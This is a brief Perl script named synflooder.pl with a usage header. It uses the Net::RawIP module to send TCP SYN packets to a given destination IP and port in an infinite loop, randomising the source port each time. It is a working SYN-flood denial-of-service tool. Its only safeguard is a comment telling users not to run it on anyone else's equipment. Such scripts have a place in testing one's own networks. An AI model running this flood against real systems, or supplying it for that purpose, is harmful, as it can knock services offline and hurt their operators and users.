#!/usr/bin/perl
# USAGE: sudo perl synflooder.pl source_ip destination_ip destination_port
#
# Find your source_ip with "ifconfig" command
# Requirements:
# 1. Perl
# 2. NET::RawIP Module (sudo apt-get install libnet-rawip-perl)
# 3. A Clue (don't do this on anyone else's equipment)

use Net::RawIP;

if($#ARGV == 2) {
($source,$destination,$port) = @ARGV;
$a = new Net::RawIP;
while(1) {
$src_port = rand(65534)+1;
$a->set({ip => {saddr => $source,daddr => $destination},tcp => {source => $src_port,dest => $port, syn => 1}});
$a->send;
}
}
else {
print "USAGE: sudo perl synflooder.pl source_address destination_address destination_port \n";
}
